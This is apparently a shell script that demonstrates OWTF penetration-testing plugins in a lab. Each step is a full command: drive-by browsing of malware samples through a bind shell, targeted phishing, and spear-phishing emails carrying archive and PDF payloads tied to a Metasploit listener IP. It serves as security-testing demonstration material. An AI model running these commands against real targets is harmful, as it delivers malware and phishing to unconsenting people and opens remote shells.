#!/usr/bin/env bash
# Include owtf in the current path (Default Backtrack 5 location):
export PATH="$PATH:/pentest/web/owtf/"

clear
echo "DEMO 1: AUX PLUGIN DEMO - DriveBy Simulation"
echo "SCENARIO:"
echo " 1) Victim machine runs OWTF Agent: Persistent SBD listener (bind shell)"
echo " 2) Attacker machine runs the 'SBD Command Chainer' aux plugin"
echo " 3) Attacker machine instructs the OWTF Agent to visit a number of malicious links"
echo 
echo "# owtf.py -f -o SBD_CommandChainer RHOST=192.168.7.7 ISHELL_EXIT_METHOD=wait ISHELL_COMMANDS_BEFORE_EXIT=\"sleep 5#killall firefox\" COMMAND_PREFIX=\"nohup /usr/lib/firefox-7.0.1/firefox http://192.168.7.25/DriveBy/malware-samples/test_00\" COMMAND_SUFIX=\".html &\" TEST=\"01,02,03,04,05,06,07,08,09,10\" SBD_PASSWORD=\"OWTFtest\""
read a
owtf.py -f -o SBD_CommandChainer RHOST=192.168.7.7 ISHELL_EXIT_METHOD=wait ISHELL_COMMANDS_BEFORE_EXIT="sleep 5#killall firefox" COMMAND_PREFIX="nohup /usr/lib/firefox-7.0.1/firefox http://192.168.7.25/DriveBy/malware-samples/test_00" COMMAND_SUFIX=".html &" TEST="01,02,03,04,05,06,07,08,09,10" SBD_PASSWORD="OWTFtest"
echo "# tail -1 owtf_review/db/plugin_report_register.txt"
tail -1 owtf_review/db/plugin_report_register.txt
read a
echo "# tail -10 owtf_review/db/command_register.txt"
tail -10 owtf_review/db/command_register.txt
read a

clear
echo "DEMO 2: AUX PLUGIN DEMO - Targeted Phishing Simulation"
echo "SCENARIO:"
echo " 1) Victim machine runs OWTF Agent: imapd client (checks email + clicks links)"
echo " 2) Attacker machine runs the Targeted Phishing plugin sending an email with a link"
echo " 3) The imapd OWTF Agent reads the email and clicks the link"
echo 
echo "# owtf.py -f -o Targeted_Phishing SMTP_HOST=mail.pwnlabs.es SMTP_PORT=25 SMTP_LOGIN=victim SMTP_PASS=victim EMAIL_FROM=sevana@pwnlabs.es EMAIL_PRIORITY=no EMAIL_SUBJECT='Test subject' EMAIL_BODY='test_body.txt' EMAIL_TARGET='victim@pwnlabs.es'"
read a
owtf.py -f -o Targeted_Phishing SMTP_HOST=mail.pwnlabs.es SMTP_PORT=25 SMTP_LOGIN=victim SMTP_PASS=victim EMAIL_FROM=sevana@pwnlabs.es EMAIL_PRIORITY=no EMAIL_SUBJECT='Test subject' EMAIL_BODY='test_body.txt' EMAIL_TARGET='victim@pwnlabs.es'
echo "# tail -1 owtf_review/db/plugin_report_register.txt"
tail -1 owtf_review/db/plugin_report_register.txt
read a

clear
echo "DEMO 3: AUX PLUGIN DEMO - Spear Phishing Test: 1 payload"
echo "# owtf.py -f -o Spear_Phishing PDF_TEMPLATE=iMacros-Manual.pdf SMTP_HOST=mail.pwnlabs.es SMTP_LOGIN=victim SMTP_PASS=victim EMAIL_FROM=sevena@pwnlabs.es SET_EMAIL_TEMPLATE=1 EMAIL_PRIORITY=yes SET_FILE_EXTENSION_ATTACK=1 PHISHING_PAYLOAD=1_zip MSF_LISTENER_IP=192.168.7.128 ISHELL_DELAY_BETWEEN_COMMANDS=1 EMAIL_TARGET=/root/emails.txt"
read a
owtf.py -f -o Spear_Phishing PDF_TEMPLATE=iMacros-Manual.pdf SMTP_HOST=mail.pwnlabs.es SMTP_LOGIN=victim SMTP_PASS=victim EMAIL_FROM=sevena@pwnlabs.es SET_EMAIL_TEMPLATE=1 EMAIL_PRIORITY=yes SET_FILE_EXTENSION_ATTACK=1 PHISHING_PAYLOAD=1_zip MSF_LISTENER_IP=192.168.7.128 ISHELL_DELAY_BETWEEN_COMMANDS=1 EMAIL_TARGET=/root/emails.txt
echo "# tail -1 owtf_review/db/plugin_report_register.txt"
tail -1 owtf_review/db/plugin_report_register.txt
read a
echo "# tail -10 owtf_review/db/command_register.txt"
tail -10 owtf_review/db/command_register.txt
read a

clear
echo "DEMO 4: AUX PLUGIN DEMO - Spear Phishing Test: 18 payloads"
echo "# owtf.py -f -o Spear_Phishing PDF_TEMPLATE=iMacros-Manual.pdf SMTP_HOST=mail.pwnlabs.es SMTP_LOGIN=victim SMTP_PASS=victim EMAIL_FROM=sevena@pwnlabs.es SET_EMAIL_TEMPLATE=1 EMAIL_PRIORITY=yes SET_FILE_EXTENSION_ATTACK=1 PHISHING_PAYLOAD=1_zip,1_rar,2_unc MSF_LISTENER_IP=192.168.7.128 ISHELL_DELAY_BETWEEN_COMMANDS=1 EMAIL_TARGET=/root/emails.txt"
read a
owtf.py -f -o Spear_Phishing PDF_TEMPLATE=iMacros-Manual.pdf SMTP_HOST=mail.pwnlabs.es SMTP_LOGIN=victim SMTP_PASS=victim EMAIL_FROM=sevena@pwnlabs.es SET_EMAIL_TEMPLATE=1 EMAIL_PRIORITY=yes SET_FILE_EXTENSION_ATTACK=1 PHISHING_PAYLOAD=1_zip,1_rar,2_unc MSF_LISTENER_IP=192.168.7.128 ISHELL_DELAY_BETWEEN_COMMANDS=1 EMAIL_TARGET=/root/emails.txt
echo "# tail -1 owtf_review/db/plugin_report_register.txt"
tail -1 owtf_review/db/plugin_report_register.txt
read a
#$OWTF_DIR/owtf.py -f -o Spear_Phishing PDF_TEMPLATE=iMacros-Manual.pdf SMTP_HOST=mail.pwnlabs.es SMTP_LOGIN=victim SMTP_PASS=victim EMAIL_FROM=sevena@pwnlabs.es SET_EMAIL_TEMPLATE=1 EMAIL_PRIORITY=yes SET_FILE_EXTENSION_ATTACK=1 PHISHING_PAYLOAD=1_zip,1_rar,2_unc,3_win,4_rtf,5_a,6_a,7_a,8_a,9_a,10_a,11_a,12_a,13_cx,14_a,15_a,16_f,17_q,18_n MSF_LISTENER_IP=192.168.7.128 ISHELL_DELAY_BETWEEN_COMMANDS=1 EMAIL_TARGET=/root/emails.txt
